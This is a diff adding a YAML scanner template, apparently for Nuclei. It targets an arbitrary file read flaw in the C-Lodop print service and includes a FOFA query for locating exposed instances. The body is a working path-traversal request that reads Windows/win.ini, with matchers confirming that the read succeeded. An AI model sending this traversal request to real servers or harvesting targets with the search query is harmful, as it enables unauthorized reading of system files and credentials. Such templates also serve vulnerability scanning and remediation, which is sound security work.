@@ -1,0 +1,31 @@
+id: c-lodop-print-service-system-arbitrary-file-read
+
+info:
+  name: C-Lodop打印服务系统任意文件读取漏洞
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="C-Lodop打印服务系统"
+    C-Lodop打印服务系统是一款功能强大的云打印工具，支持通过JavaScript语句实现远程打印，兼容所有浏览器，无需安装插件或APP，客户端零安装。该漏洞影响泰安梦泰尔软件有限公司的C-Lodop打印服务系统，默认开启的端口可能被用于攻击。C-Lodop打印服务系统因未对文件读取操作进行有效限制，攻击者可通过构造特殊URL读取服务器上的任意文件，如系统配置文件、数据库凭据等，可能导致敏感信息泄露。
+  tags: C-Lodop
+
+http:
+- raw:
+  - |
+    GET /../../../../../../../../../../Windows/win.ini HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+      - "bit app support"
+      - "fonts"
+      - "extensions"
+    condition: and
